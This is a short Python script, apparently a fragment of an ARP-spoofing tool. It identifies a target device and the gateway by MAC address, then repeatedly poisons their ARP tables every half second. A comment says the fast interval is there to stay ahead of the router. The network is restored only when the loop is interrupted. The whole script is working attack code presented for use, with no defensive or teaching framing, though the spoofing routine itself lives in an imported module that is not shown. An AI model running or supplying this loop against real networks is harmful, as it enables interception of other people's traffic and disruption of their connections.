from core import spoof
import time

# Get initial info
print("[*] Identifying target...")
target_mac, target_name = spoof.get_device_info(target_ip)
gateway_mac, _ = spoof.get_device_info(gateway_ip)

if target_mac:
    print(f"[+] Target: {target_name} | MAC: {target_mac}")
    
    try:
        while True:
            # Aggressive loop for modern hardware
            spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
            time.sleep(0.5) # Fast interval (0.5s) to stay ahead of the router
    except KeyboardInterrupt:
        print("\n[*] Stopping... restoring network for the target.")
        spoof.restore(target_ip, gateway_ip)
